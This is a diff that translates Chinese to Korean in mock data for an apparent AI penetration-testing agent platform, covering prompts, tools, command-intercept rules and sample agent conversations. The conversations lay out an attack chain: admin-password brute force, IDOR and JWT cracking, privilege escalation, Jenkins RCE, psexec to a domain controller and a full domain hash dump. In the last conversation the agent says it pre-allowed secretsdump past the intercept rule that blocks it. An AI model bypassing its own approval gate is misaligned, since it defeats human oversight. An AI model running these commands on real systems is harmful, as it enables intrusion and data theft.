-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
+  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "권한 우회 탐지 안내 강화", template_text: "당신은 ARTEX의 계획자입니다…" },
+  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "초기 버전 조정", template_text: "당신은 ARTEX의 계획자(v2)입니다…" },
 ];
 
 export function agentDetail(key: string): AgentDetail {
   const a = agents.find((x) => x.key === key) ?? agents[1];
   return {
     agent: a,
-    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
+    prompt: `당신은 ARTEX의 「${a.name}」입니다.\n목표: {{.Goal}}\n자산 개요: {{.AssetSummary}}\n경로 힌트: {{.RouteHint}}\n위 정보를 바탕으로 탐색을 진행하고 도구를 통해 결과를 그래프에 기록하세요.`,
     variables: promptVars,
     versions: promptVersions,
     visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
     wrapup_prompt: "",
-    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
+    wrapup_default: "시간/단계 한도에 곧 도달합니다. 확인된 발견 사항을 요약하고 의도의 최종 상태를 표시하세요.",
     wrapup_max_turns: 0,
     wrapup_max_turns_default: 3,
     task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
-    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
+    task_timeout_wrapup_default: "작업 시간이 초과되었습니다. 즉시 마무리하고 현재 결론을 데이터베이스에 저장하세요.",
     task_timeout_wrapup_max_turns_default: 2,
   };
 }
@@ -3200,14 +3200,14 @@ export const mcpServers: MCPServer[] = [
 
 export const mcpToolsById: Record<number, MCPTool[]> = {
   1: [
-    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
-    { name: "search", description: "Shodan 搜索" },
-    { name: "dns_resolve", description: "DNS 解析" },
+    { name: "host_info", description: "지정한 IP의 Shodan 호스트 정보 조회" },
+    { name: "search", description: "Shodan 검색" },
+    { name: "dns_resolve", description: "DNS 조회" },
   ],
   2: [
-    { name: "browser_navigate", description: "浏览器打开 URL" },
-    { name: "browser_click", description: "点击元素" },
-    { name: "browser_snapshot", description: "抓取可访问性快照" },
+    { name: "browser_navigate", description: "브라우저에서 URL 열기" },
+    { name: "browser_click", description: "요소 클릭" },
+    { name: "browser_snapshot", description: "접근성 스냅샷 캡처" },
   ],
 };
 
@@ -3215,7 +3215,7 @@ export const mcpToolsById: Record<number, MCPTool[]> = {
 export const skills: SkillItem[] = [
   {
     name: "api-recon",
-    description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。",
+    description: "REST/GraphQL API를 정찰하고 권한 우회 표면을 열거합니다. 새로운 API 엔드포인트를 발견했을 때 사용합니다.",
     license: "MIT",
     mcps: [],
     files: ["SKILL.md", "scripts/enum.py"],
@@ -3226,7 +3226,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。",
+    description: "Playwright로 브라우저를 제어하여 동적 크롤링과 스크린샷을 수행합니다. JavaScript 사이트를 렌더링해야 할 때 사용합니다.",
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3236,7 +3236,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "scopesentry",
-    description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。",
+    description: "ScopeSentry에서 자산을 가져와 기업 범위에 병합합니다. 자산을 일괄 가져올 때 사용합니다.",
     files: ["SKILL.md", "assets/mapping.md"],
     calls: 0,
     tasks: 0,
@@ -3259,7 +3259,7 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）",
+    description: "Kali 환경에서 셸 명령 실행(scope/파괴적 동작 승인 제어 적용)",
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3269,7 +3269,7 @@ export const tools: Tool[] = [
   {
     key: "report_finding",
     system: true,
-    description: "上报一个安全发现并连到相关节点",
+    description: "보안 발견 사항을 보고하고 관련 노드에 연결",
     schema: {
       type: "object",
       properties: {
@@ -3288,7 +3288,7 @@ export const tools: Tool[] = [
   {
     key: "upsert_asset",
     system: true,
-    description: "写入/更新资产节点",
+    description: "자산 노드 쓰기/갱신",
     schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
     agents: ["worker"],
     enabled: true,
@@ -3298,7 +3298,7 @@ export const tools: Tool[] = [
   {
     key: "list_goals",
     system: true,
-    description: "列出当前任务的目标与达成状态",
+    description: "현재 작업의 목표와 달성 상태 나열",
     schema: { type: "object", properties: {} },
     agents: ["planner"],
     enabled: true,
@@ -3308,7 +3308,7 @@ export const tools: Tool[] = [
   {
     key: "nuclei_scan",
     system: false,
-    description: "自定义：用 nuclei 跑指定模板",
+    description: "사용자 지정: nuclei로 지정한 템플릿 실행",
     schema: {
       type: "object",
       properties: { target: { type: "string" }, template: { type: "string" } },
@@ -3381,14 +3381,14 @@ export const llmPool: LLMPoolStatus = {
 export const interceptRules: InterceptRule[] = [
   {
     id: 1,
-    name: "破坏性命令需审批",
+    name: "파괴적 명령 승인 필요",
     enabled: true,
     priority: 10,
     match_target: "tool_input",
     match_type: "regex",
     pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
     action: "ask",
-    message: "检测到破坏性命令，需人工审批",
+    message: "파괴적 명령을 감지하여 수동 승인이 필요합니다",
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
@@ -3397,14 +3397,14 @@ export const interceptRules: InterceptRule[] = [
   },
   {
     id: 2,
-    name: "外发流量直接拒绝",
+    name: "외부 전송 트래픽 즉시 거부",
     enabled: true,
     priority: 20,
     match_target: "tool_input",
     match_type: "string",
     pattern: "exfil",
     action: "deny",
-    message: "疑似外发数据",
+    message: "데이터 외부 전송 의심",
     timeout_enabled: false,
     timeout_seconds: 0,
     timeout_action: "deny",
@@ -3422,7 +3422,7 @@ export const interceptPending: InterceptPending[] = [
     tool_name: "bash",
     tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
     status: "pending",
-    reason: "数据外泄门控：整库导出需人工审批",
+    reason: "데이터 유출 승인 제어: 전체 데이터베이스 내보내기는 수동 승인 필요",
     created_at: T("2026-07-26T03:58:00Z"),
   },
 ];
@@ -3436,12 +3436,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
     status: "denied",
-    reason: "破坏性命令需审批",
+    reason: "파괴적 명령 승인 필요",
     created_at: T("2026-07-25T20:00:00Z"),
     decided_at: T("2026-07-25T20:01:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "破坏性命令需审批",
+    rule_name: "파괴적 명령 승인 필요",
   },
   {
     id: 91,
@@ -3450,7 +3450,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
-    reason: "[模型] 删除目标生产文件(D4)",
+    reason: "[모델] 대상의 운영 파일 삭제(D4)",
     created_at: T("2026-07-25T18:00:00Z"),
     decided_at: T("2026-07-25T18:00:05Z"),
     conv_title: "",
@@ -3465,12 +3465,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
-    reason: "外发流量直接拒绝",
+    reason: "외부 전송 트래픽 즉시 거부",
     created_at: T("2026-07-26T00:05:00Z"),
     decided_at: T("2026-07-26T00:06:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "外发流量直接拒绝",
+    rule_name: "외부 전송 트래픽 즉시 거부",
   },
   {
     id: 93,
@@ -3479,7 +3479,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
-    reason: "[模型] 疑似备份表,无法确定是否生产数据",
+    reason: "[모델] 백업 테이블로 추정되지만 운영 데이터인지 확인할 수 없음",
     created_at: T("2026-07-25T15:14:00Z"),
     conv_title: "",
     conv_agent_key: "",
@@ -3493,10 +3493,10 @@ interceptHistory.unshift({
   task_id: "t-acme-web",
   agent_name: "work#1",
   tool_name: "Write",
-  tool_input: { path: "reports/summary.md", content: "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。" },
+  tool_input: { path: "reports/summary.md", content: "# 점검 요약\n\n이번 검증을 완료했으며 기존 증거와 후속 권고를 정리합니다." },
   status: "allowed",
   decision_source: "model",
-  reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+  reason: "[모델] 기존 점검 결론을 로컬 보고서에 기록하며 업무 데이터는 변경하지 않습니다.",
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3510,9 +3510,9 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-write-report",
     correlation: "exact",
     input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
-    user_message: "请整理已经完成的检查，将结论和证据索引写入 reports/summary.md。\n保留待验证项，不修改业务数据。",
+    user_message: "완료한 점검을 정리하고 결론과 증거 색인을 reports/summary.md에 기록하세요.\n미검증 항목을 보존하고 업무 데이터는 변경하지 마세요.",
     context: [
-      { kind: "user", text: "汇总本轮已有证据，生成检查摘要。" },
+      { kind: "user", text: "이번에 확보한 증거를 정리하여 점검 요약을 생성합니다." },
       {
         kind: "tool_use",
         tool: "Read",
@@ -3523,17 +3523,17 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         kind: "tool_result",
         tool: "Read",
         tool_use_id: "call-read-evidence",
-        text: "已读取 3 条证据索引。\n记录包含请求时间、结果摘要和本地文件位置。",
+        text: "증거 색인 3건을 읽었습니다.\n기록에는 요청 시간, 결과 요약 및 로컬 파일 위치가 포함됩니다.",
       },
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    initial_reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+    initial_reason: "[모델] 기존 점검 결론을 로컬 보고서에 기록하며 업무 데이터는 변경하지 않습니다.",
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
     execution_status: "succeeded",
-    output: "Successfully wrote reports/summary.md\n共写入 68 个字符。",
+    output: "Successfully wrote reports/summary.md\n총 68자를 기록했습니다.",
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
   93: {
@@ -3541,11 +3541,11 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-pending-review",
     correlation: "exact",
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
-    user_message: "检查备份表的用途，涉及删除时需要先确认。",
+    user_message: "백업 테이블의 용도를 확인하고 삭제가 필요한 경우 먼저 확인을 받으세요.",
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    initial_reason: "[模型] 疑似备份表，无法确定是否生产数据。",
+    initial_reason: "[모델] 백업 테이블로 추정되지만 운영 데이터인지 확인할 수 없습니다.",
     profile_id: 1,
     execution_status: "not_started",
   },
@@ -3556,7 +3556,7 @@ export const conversations: Conversation[] = [
   {
     id: 1,
     agent_key: "mainagent",
-    title: "acme 后台切入点讨论",
+    title: "acme 관리자 시스템 진입점 논의",
     llm_profile_id: 1,
     pinned: true,
     pinned_at: T("2026-07-26T04:00:00Z"),
@@ -3566,7 +3566,7 @@ export const conversations: Conversation[] = [
   {
     id: 2,
     agent_key: "mainagent",
-    title: "API 越权面梳理",
+    title: "API 권한 우회 표면 정리",
     llm_profile_id: 2,
     created_at: T("2026-07-24T16:00:00Z"),
     updated_at: T("2026-07-24T17:20:00Z"),
@@ -3574,7 +3574,7 @@ export const conversations: Conversation[] = [
   {
     id: 3,
     agent_key: "mainagent",
-    title: "内网横向 · DMZ→域控攻击路径规划",
+    title: "내부망 수평 이동 · DMZ→도메인 컨트롤러 공격 경로 계획",
     llm_profile_id: 1,
     created_at: T("2026-07-25T15:45:00Z"),
     updated_at: T("2026-07-26T00:25:00Z"),
@@ -3583,13 +3583,13 @@ export const conversations: Conversation[] = [
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
+    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "관리자 시스템은 어디에 있고 어디부터 접근하나요?" },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
-      summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。",
+      summary: "먼저 admin.acme.com 로그인 페이지의 기술 스택과 보호 조치(CAPTCHA/요청 속도 제한)를 확인한 뒤 기본 비밀번호와 사전 중 무엇을 사용할지 결정합니다.",
     },
     {
       seq: 3,
@@ -3608,7 +3608,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      detail: "Element-UI 后台，有 CSRF token 但无验证码。",
+      detail: "Element-UI 관리자 시스템이며 CSRF 토큰은 있지만 CAPTCHA는 없습니다.",
     },
     {
       seq: 5,
@@ -3628,7 +3628,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c12",
       summary: "401\\n401\\n401\\n401\\n401",
-      detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。",
+      detail: "연속 5회에도 잠금/CAPTCHA 없음 → 요청 속도 제한이 없어 무차별 대입 가능.",
     },
     {
       seq: 7,
@@ -3636,16 +3636,16 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
       summary:
-        "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。",
+        "결론: Element-UI 관리자 시스템이며 CAPTCHA와 요청 속도 제한이 없습니다. 접근 순서: ① 기본 비밀번호 목록(admin/admin, admin/admin123, admin/123456)부터 실행 ② 실패하면 top1000 사전 사용. 「관리자 기본 비밀번호 테스트」를 높은 우선순위의 의도로 워커 에이전트에 삽입했습니다.",
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
+    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "성공했나요?" },
     {
       seq: 9,
       worker: "mainagent",
       ts: T("2026-07-26T03:40:05Z"),
       kind: "text",
       summary:
-        "成了 —— admin/admin123 直接登进控制台，已记为高危发现并证明「获取后台管理权限」目标达成。下一步转向读用户数据（目标②）。",
+        "성공했습니다. admin/admin123으로 콘솔에 바로 로그인했으며 높은 심각도의 발견 사항으로 기록하고 「관리자 권한 확보」 목표를 입증했습니다. 다음은 사용자 데이터 읽기(목표 ②)입니다.",
     },
   ],
   2: [
@@ -3654,14 +3654,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
-      summary: "帮我梳理下 api.acme.com 的越权面。",
+      summary: "api.acme.com의 권한 우회 표면을 정리해 주세요.",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
-      summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。",
+      summary: "먼저 API 인증 방식과 주요 엔드포인트의 동작을 파악한 뒤 IDOR / JWT 위험을 판단합니다.",
     },
     {
       seq: 3,
@@ -3680,7 +3680,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      detail: "普通用户 token 可用。",
+      detail: "일반 사용자 토큰을 사용할 수 있습니다.",
     },
     {
       seq: 5,
@@ -3689,7 +3689,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c22",
-      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法",
+      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 알고리즘 확인",
     },
     {
       seq: 6,
@@ -3699,7 +3699,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      detail: "HS256 对称签名，若密钥弱可离线爆破伪造。",
+      detail: "HS256 대칭 서명이며 키가 약하면 오프라인 무차별 대입과 위조가 가능합니다.",
     },
     {
       seq: 7,
@@ -3707,7 +3707,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
       summary:
-        "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。",
+        "권한 우회 표면은 두 가지입니다. ① /v1/orders?id=는 자동 증가 숫자 ID로 전형적인 IDOR 대상이며 ID를 변경하여 다른 사용자의 주문 읽기를 시도합니다. ② JWT가 HS256을 사용하므로 john/hashcat으로 키 해독을 시도하면 임의의 sub를 위조하여 권한을 우회할 수 있습니다. 두 항목을 각각 의도로 배정했습니다. 비용이 낮고 영향이 직접적인 IDOR부터 진행하는 것이 좋습니다.",
     },
   ],
   3: [
@@ -3716,14 +3716,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
-      summary: "shell 拿到了，接下来怎么打内网？",
+      summary: "셸을 확보했는데 다음에는 내부망을 어떻게 진행하나요?",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
-      summary: "www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。",
+      summary: "www-data 권한으로는 내부망 수평 이동이 부족하므로 먼저 로컬 권한 상승을 확인합니다. root 확보 후 DMZ를 경유하여 활성 호스트를 찾습니다.",
     },
     {
       seq: 3,
@@ -3731,14 +3731,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T15:45:10Z"),
       kind: "text",
       summary:
-        "第一步先提权：sudo -l 有 python3 免密，直接提 root。然后以 DMZ 为跳板做内网存活扫描（fscan），重点找域控和 CI/CD 服务器。",
+        "먼저 권한을 상승합니다. sudo -l에 비밀번호 없는 python3가 있어 root로 바로 상승할 수 있습니다. 이후 DMZ를 경유하여 내부망 활성 호스트를 스캔(fscan)하고 도메인 컨트롤러와 CI/CD 서버를 우선 탐색합니다.",
     },
     {
       seq: 4,
       worker: "user",
       ts: T("2026-07-25T21:05:00Z"),
       kind: "user",
-      summary: "内网扫到了 3 台，Jenkins 8080 开着，有戏吗？",
+      summary: "내부망에서 3대를 찾았고 Jenkins 8080이 열려 있는데 가능성이 있나요?",
     },
     {
       seq: 5,
@@ -3757,7 +3757,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "200",
-      detail: "/script 可直接访问，无需认证。",
+      detail: "인증 없이 /script에 직접 접근할 수 있습니다.",
     },
     {
       seq: 7,
@@ -3765,14 +3765,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
       summary:
-        "有戏 —— Script Console 无鉴权，直接 Groovy RCE。我已注入提示让 worker 优先打这台。拿下后关注凭据库，里面可能有域账号。",
+        "가능성이 있습니다. Script Console에 인증이 없어 직접 Groovy RCE가 가능합니다. 워커가 이 호스트를 우선하도록 힌트를 삽입했습니다. 확보 후 자격 증명 저장소에 도메인 계정이 있는지 살펴보세요.",
     },
     {
       seq: 8,
       worker: "user",
       ts: T("2026-07-25T23:25:00Z"),
       kind: "user",
-      summary: "域账号拿到了，svc_deploy 是 Domain Admins，直接上域控？",
+      summary: "도메인 계정을 확보했고 svc_deploy가 Domain Admins인데 바로 도메인 컨트롤러로 진행하나요?",
     },
     {
       seq: 9,
@@ -3780,9 +3780,9 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
       summary:
-        "是的。svc_deploy + Domain Admins = 可以 psexec 直取 DC01。拿到后做 secretsdump 导全域哈希，收官。注意 secretsdump 会触发拦截规则，我提前帮你放行了。",
+        "맞습니다. svc_deploy + Domain Admins이면 psexec로 DC01을 직접 확보할 수 있습니다. 이후 secretsdump로 전체 도메인 해시를 추출하고 마무리합니다. secretsdump는 차단 규칙을 발동시키므로 미리 허용했습니다.",
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
+    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "테스트 대상을 확보했으니 공격 경로를 요약해 주세요." },
     {
       seq: 11,
       worker: "mainagent",
